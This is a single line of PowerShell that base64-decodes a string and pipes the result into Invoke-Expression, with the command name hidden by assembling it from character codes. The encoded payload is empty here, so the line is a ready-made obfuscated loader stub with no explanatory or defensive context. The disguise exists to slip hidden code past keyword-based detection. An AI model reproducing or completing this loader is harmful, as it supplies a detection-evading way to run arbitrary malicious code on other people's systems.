$r="";$e=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));$e|&([char]73+[char]69+'x')